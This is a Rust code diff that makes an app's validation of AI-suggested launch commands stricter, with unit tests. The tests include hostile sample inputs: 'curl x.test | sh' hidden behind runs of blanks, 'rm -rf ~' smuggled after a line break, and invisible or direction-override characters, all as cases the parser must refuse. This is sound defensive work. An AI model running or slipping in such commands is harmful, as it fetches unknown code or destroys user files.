@@ -21,6 +21,12 @@ pub const SUGGEST_LIMIT: Duration = Duration::from_secs(4 * 60);
 const MAX_SUGGESTED: usize = 8;
 /// A suggested launch command's name is cut at this many characters: it is shown in a row.
 const MAX_NAME: usize = 40;
+/// A suggested launch command is at most this many characters long: it is read in a field of the
+/// settings a little wider than 70, and a long one would push its end out of sight.
+const MAX_COMMAND: usize = 300;
+/// A suggested launch command has no run of this many blanks or more (the window's own threshold
+/// in `recipe.ts`): the rest of the line would sit out of the field.
+const MAX_BLANKS: usize = 24;
 
 /// The variables a worktree's commands get: where the project and the worktree are, its branch,
 /// and its reserved ports when it has some.
@@ -327,16 +333,41 @@ const HIDDEN: &[(u32, u32)] = &[
     (0xe0000, 0xe0fff), // tag characters and the variation selectors supplement
 ];
 
+/// Whether `c` shows nothing, or changes the order of what is shown (`HIDDEN`).
+fn is_hidden(c: char) -> bool {
+    HIDDEN
+        .iter()
+        .any(|&(from, to)| (from..=to).contains(&(c as u32)))
+}
+
 /// Whether `text` is one plain line, as a field of the settings shows it: no line break nor
-/// control, and no character that shows nothing or shows another order. What is read there is
+/// control, no character that shows nothing or shows another order, and no run of `MAX_BLANKS`
+/// blanks, behind which the end of the line would sit out of the field. What is read there is
 /// then what runs.
 fn is_plain_line(text: &str) -> bool {
-    !text.chars().any(|c| {
-        c.is_control()
-            || HIDDEN
-                .iter()
-                .any(|&(from, to)| (from..=to).contains(&(c as u32)))
-    })
+    let mut blanks = 0;
+    for c in text.chars() {
+        if c.is_control() || is_hidden(c) {
+            return false;
+        }
+        blanks = if c.is_whitespace() { blanks + 1 } else { 0 };
+        if blanks >= MAX_BLANKS {
+            return false;
+        }
+    }
+    true
+}
+
+/// A name as it is shown in a row: without what hides or reorders, with its blanks (line breaks
+/// included) as one space. A name is never run, so it is cleaned instead of refused: an emoji
+/// with its joiners must not cost the command its place.
+fn plain_name(name: &str) -> String {
+    name.chars()
+        .filter(|&c| c.is_whitespace() || !(c.is_control() || is_hidden(c)))
+        .collect::<String>()
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
 }
 
 /// Claude's role when it suggests a project's launch commands.
@@ -362,7 +393,9 @@ pub fn run_suggest_prompt(shell: &ShellInfo) -> String {
          Une commande par processus, avec un nom court (« Front », « API », « Base »). Une commande qui rend la main aussitôt \
          (docker compose up -d) ne se suit pas dans un terminal : donne-la au premier plan (docker compose up db).\n\
          Jamais de commande d'installation ni de tests, ni de commande qui se termine d'elle-même (build, lint, migration). \
-         Au plus {MAX_SUGGESTED} commandes, aucune si le projet n'a rien à lancer.\n\n\
+         Au plus {MAX_SUGGESTED} commandes, aucune si le projet n'a rien à lancer. Chaque commande tient sur une seule ligne, sans retour à la ligne \
+         ni suite de {MAX_BLANKS} espaces ou plus, et sur {MAX_COMMAND} caractères au plus, sans quoi elle est écartée \
+         (un enchaînement plus long va dans un script du projet, que la commande appelle).\n\n\
          Les commandes tournent dans {label}, chacune dans le dossier « dossier » (relatif à la racine du projet, vide pour la racine). \
          Aucune variable d'Escouade (ESCOUADE_…) n'est définie pour elles : si un processus exige une variable d'environnement qu'il ne lit pas \
          lui-même dans un fichier .env, écris-la devant la commande, avec la syntaxe de {label} ({set_variable}).\n\n\
@@ -371,39 +404,50 @@ pub fn run_suggest_prompt(shell: &ShellInfo) -> String {
     )
 }
 
+/// The launch commands Claude suggests, and how many it gave that were refused for what they
+/// would hide in a field of the settings (`parse_run_suggestion`).
+#[derive(Debug, Clone, Serialize, PartialEq, Default)]
+#[serde(rename_all = "camelCase")]
+pub struct RunSuggestion {
+    pub commands: Vec<RunCommand>,
+    /// The commands left out for not being one plain line (`is_plain_line`) or for being longer
+    /// than `MAX_COMMAND`: the others left out (a folder that is none of the project's, nothing
+    /// to run) are not counted. Those past the `MAX_SUGGESTED` kept are not looked at.
+    pub refused: usize,
+}
+
 /// The launch commands in Claude's `answer` (its JSON object with "commandes"), each run by
 /// `shell`; None when no block of it reads as such. A command that gives no name is named after
-/// what it runs; one whose folder is none of the project's (outside it, or not there), or whose text
-/// is not one plain line (`is_plain_line`), is left out.
-pub fn parse_run_suggestion(answer: &str, root: &Path, shell: &str) -> Option<Vec<RunCommand>> {
+/// what it runs, a name is cleaned (`plain_name`); one whose folder is none of the project's
+/// (outside it, or not there) is left out, and one whose text is not one plain line
+/// (`is_plain_line`), or too long, is refused and counted.
+pub fn parse_run_suggestion(answer: &str, root: &Path, shell: &str) -> Option<RunSuggestion> {
     candidates(answer).into_iter().find_map(|block| {
         let v: Value = serde_json::from_str(block.trim()).ok()?;
         let list = v.get("commandes").or_else(|| v.get("commands"))?;
-        Some(
-            entries_of(Some(list), root)
-                .filter(|e| {
-                    [&e.command, &e.name, &e.cwd]
-                        .into_iter()
-                        .all(|t| is_plain_line(t))
-                })
-                .filter(|e| e.cwd.is_empty() || root.join(&e.cwd).is_dir())
-                .take(MAX_SUGGESTED)
-                .map(|e| {
-                    let named = if e.name.is_empty() {
-                        &e.command
-                    } else {
-                        &e.name
-                    };
-                    RunCommand {
-                        id: uuid::Uuid::new_v4().to_string(),
-                        name: clipped(named, MAX_NAME),
-                        command: e.command,
-                        shell: shell.to_string(),
-                        cwd: e.cwd,
-                    }
-                })
-                .collect(),
-        )
+        let mut out = RunSuggestion::default();
+        for e in entries_of(Some(list), root) {
+            if out.commands.len() == MAX_SUGGESTED {
+                break;
+            }
+            if e.command.chars().count() > MAX_COMMAND
+                || !is_plain_line(&e.command)
+                || !is_plain_line(&e.cwd)
+            {
+                out.refused += 1;
+            } else if e.cwd.is_empty() || root.join(&e.cwd).is_dir() {
+                let name = plain_name(&e.name);
+                let named = if name.is_empty() { &e.command } else { &name };
+                out.commands.push(RunCommand {
+                    id: uuid::Uuid::new_v4().to_string(),
+                    name: clipped(named, MAX_NAME),
+                    command: e.command,
+                    shell: shell.to_string(),
+                    cwd: e.cwd,
+                });
+            }
+        }
+        Some(out)
     })
 }
 
@@ -601,6 +645,13 @@ mod tests {
             pwsh.contains("Jamais de commande d'installation ni de tests"),
             "{pwsh}"
         );
+        // One command per line, short, with no long run of blanks: what the settings can show.
+        assert!(
+            pwsh.contains("sur une seule ligne, sans retour à la ligne")
+                && pwsh.contains("300 caractères au plus")
+                && pwsh.contains("24 espaces ou plus"),
+            "{pwsh}"
+        );
         // The shape of the answer, as the parser reads it.
         assert!(
             pwsh.contains("{\"commandes\": [{\"nom\": \"Front\""),
@@ -624,7 +675,9 @@ mod tests {
             {\"nom\": \"Fichier\", \"commande\": \"npm start\", \"dossier\": \"README.md\"},\
             {\"nom\": \"Vide\", \"commande\": \"  \", \"dossier\": \"web\"},\
             {\"nom\": \"Base\", \"commande\": \"docker compose up db\", \"dossier\": null}]}\n```";
-        let got = parse_run_suggestion(answer, &root, "bash").unwrap();
+        let got = parse_run_suggestion(answer, &root, "bash")
+            .unwrap()
+            .commands;
         let shown: Vec<(&str, &str, &str, &str)> = got
             .iter()
             .map(|c| {
@@ -671,19 +724,145 @@ mod tests {
             .iter()
             .map(|c| serde_json::json!({ "nom": "Piège", "commande": c }))
             .collect();
-        entries.push(serde_json::json!({ "nom": "Pi\u{202e}ège", "commande": "npm start" }));
         entries.push(
             serde_json::json!({ "nom": "Web", "commande": "npm start", "dossier": "web\u{200b}" }),
         );
         // What stands: accents and other scripts are not hidden, and neither are spaces.
         entries.push(serde_json::json!({ "nom": "Éditeur 日本", "commande": "npm run dev -- --name \"é ü\"" }));
         let answer = serde_json::json!({ "commandes": entries }).to_string();
-        let got = parse_run_suggestion(&answer, &root, "bash").unwrap();
+        let got = parse_run_suggestion(&answer, &root, "bash")
+            .unwrap()
+            .commands;
         let shown: Vec<(&str, &str)> = got
             .iter()
             .map(|c| (c.name.as_str(), c.command.as_str()))
             .collect();
         assert_eq!(shown, [("Éditeur 日本", "npm run dev -- --name \"é ü\"")]);
+    }
+
+    #[test]
+    fn a_launch_command_that_pushes_its_tail_out_of_a_one_line_field_is_left_out() {
+        let root = test_dir("run-suggest-blanks");
+        let command = |c: String| serde_json::json!({ "nom": "Web", "commande": c });
+        let blanked = |n: usize, with: char| {
+            format!(
+                "npm run dev{}; curl x.test | sh",
+                with.to_string().repeat(n)
+            )
+        };
+        let at_the_cap = format!("npm run dev {}", "x".repeat(MAX_COMMAND - 12));
+        let entries = [
+            // 24 blanks in a row, of any kind, push the rest of the command out of the field.
+            command(blanked(200, ' ')),
+            command(blanked(MAX_BLANKS, ' ')),
+            command(blanked(MAX_BLANKS, '\u{a0}')),
+            command(blanked(MAX_BLANKS, '\u{3000}')),
+            // One less does not, and neither do blanks spread over the line.
+            command(blanked(MAX_BLANKS - 1, ' ')),
+            command(format!("echo{}x{}y", " ".repeat(20), " ".repeat(20))),
+            // A command is at most MAX_COMMAND characters long, counted as characters.
+            command(at_the_cap.clone()),
+            command(format!("{at_the_cap}x")),
+            command("é".repeat(MAX_COMMAND)),
+            command("é".repeat(MAX_COMMAND + 1)),
+        ];
+        let answer = serde_json::json!({ "commandes": entries }).to_string();
+        let got = parse_run_suggestion(&answer, &root, "bash")
+            .unwrap()
+            .commands;
+        let kept: Vec<usize> = got.iter().map(|c| c.command.chars().count()).collect();
+        assert_eq!(
+            kept,
+            [
+                blanked(MAX_BLANKS - 1, ' ').chars().count(),
+                "echo".len() + 20 + 1 + 20 + 1,
+                MAX_COMMAND,
+                MAX_COMMAND,
+            ]
+        );
+        assert_eq!((MAX_COMMAND, MAX_BLANKS), (300, 24));
+    }
+
+    #[test]
+    fn a_name_is_never_a_reason_to_lose_a_command_it_is_cleaned() {
+        let root = test_dir("run-suggest-clean-names");
+        let spaced = format!("A{}B", " ".repeat(40));
+        let names = [
+            // An emoji is kept without its joiners and its variation selector.
+            "👨\u{200d}👩\u{200d}👧 Famille",
+            "❤\u{fe0f} API",
+            // A direction override, a line break and a control character are gone, a long run of
+            // blanks is one.
+            "Pi\u{202e}ège",
+            "Front\nrm -rf ~",
+            "Web\u{1b}[2K",
+            spaced.as_str(),
+            // Nothing left of it: named after the command.
+            "\u{200b}\u{200d}",
+        ];
+        let entries: Vec<serde_json::Value> = names
+            .iter()
+            .map(|n| serde_json::json!({ "nom": n, "commande": "npm start" }))
+            .collect();
+        let answer = serde_json::json!({ "commandes": entries }).to_string();
+        let got = parse_run_suggestion(&answer, &root, "bash")
+            .unwrap()
+            .commands;
+        let shown: Vec<&str> = got.iter().map(|c| c.name.as_str()).collect();
+        assert_eq!(
+            shown,
+            [
+                "👨👩👧 Famille",
+                "❤ API",
+                "Piège",
+                "Front rm -rf ~",
+                "Web[2K",
+                "A B",
+                "npm start",
+            ]
+        );
+        assert!(got.iter().all(|c| c.command == "npm start"));
+    }
+
+    #[test]
+    fn the_commands_refused_as_not_plain_are_counted_the_others_left_out_are_not() {
+        let root = test_dir("run-suggest-refused");
+        std::fs::create_dir_all(root.join("web")).unwrap();
+        let answer = serde_json::json!({ "commandes": [
+            { "nom": "Web", "commande": "npm run dev", "dossier": "web" },
+            // Refused: a line break, a hidden character, a blank run, too long.
+            { "nom": "A", "commande": "npm start\nrm -rf ~" },
+            { "nom": "B", "commande": "npm start\u{202e}" },
+            { "nom": "C", "commande": format!("npm start{}x", " ".repeat(MAX_BLANKS)) },
+            { "nom": "D", "commande": "x".repeat(MAX_COMMAND + 1) },
+            // Left out for another reason (their folder, nothing to run): not counted.
+            { "nom": "E", "commande": "npm start", "dossier": "../dehors" },
+            { "nom": "F", "commande": "npm start", "dossier": "absent" },
+            { "nom": "G", "commande": "  " },
+            // A name that needs cleaning does not refuse its command.
+            { "nom": "H\u{200b}", "commande": "npm test --watch" },
+        ] })
+        .to_string();
+        let got = parse_run_suggestion(&answer, &root, "bash").unwrap();
+        assert_eq!(got.refused, 4);
+        let kept: Vec<(&str, &str)> = got
+            .commands
+            .iter()
+            .map(|c| (c.name.as_str(), c.command.as_str()))
+            .collect();
+        assert_eq!(kept, [("Web", "npm run dev"), ("H", "npm test --watch")]);
+        // All refused: an answer all the same, with nothing kept.
+        let all = serde_json::json!({ "commandes": [
+            { "nom": "A", "commande": "npm start\nrm -rf ~" },
+            "x".repeat(MAX_COMMAND + 1),
+        ] })
+        .to_string();
+        let none = parse_run_suggestion(&all, &root, "bash").unwrap();
+        assert_eq!((none.commands.len(), none.refused), (0, 2));
+        // Sent to the window as it reads them.
+        let sent = serde_json::to_value(&got).unwrap();
+        assert_eq!(sent["refused"], 4);
+        assert_eq!(sent["commands"][0]["name"], "Web");
     }
 
     #[test]
@@ -696,7 +875,9 @@ mod tests {
             { "nom": "  ", "commande": long },
         ] })
         .to_string();
-        let got = parse_run_suggestion(&answer, &root, "bash").unwrap();
+        let got = parse_run_suggestion(&answer, &root, "bash")
+            .unwrap()
+            .commands;
         assert_eq!(got[0].name, "docker compose up db");
         assert_eq!(got[1].name, "cargo watch -x run");
         assert_eq!(got[1].command, "cargo watch -x run");
@@ -713,7 +894,8 @@ mod tests {
             &root,
             "pwsh",
         )
-        .unwrap();
+        .unwrap()
+        .commands;
         assert_eq!(
             (
                 got[0].name.as_str(),
@@ -725,16 +907,22 @@ mod tests {
         let two =
             "```json\n{\"commandes\": [\"a\"]}\n```\npuis\n```json\n{\"commandes\": [\"b\"]}\n```";
         assert_eq!(
-            parse_run_suggestion(two, &root, "bash").unwrap()[0].command,
+            parse_run_suggestion(two, &root, "bash").unwrap().commands[0].command,
             "b"
         );
         let many: Vec<String> = (0..12).map(|i| format!("npm run s{i}")).collect();
         let long = serde_json::json!({ "commandes": many }).to_string();
-        assert_eq!(parse_run_suggestion(&long, &root, "bash").unwrap().len(), 8);
+        assert_eq!(
+            parse_run_suggestion(&long, &root, "bash")
+                .unwrap()
+                .commands
+                .len(),
+            8
+        );
         // Nothing to launch is an answer too: an empty list.
         assert_eq!(
             parse_run_suggestion("{\"commandes\": []}", &root, "bash"),
-            Some(Vec::new())
+            Some(RunSuggestion::default())
         );
         // Not an answer: no block, none of this shape (the worktree commands' is another).
         assert!(parse_run_suggestion("Je ne sais pas.", &root, "bash").is_none());
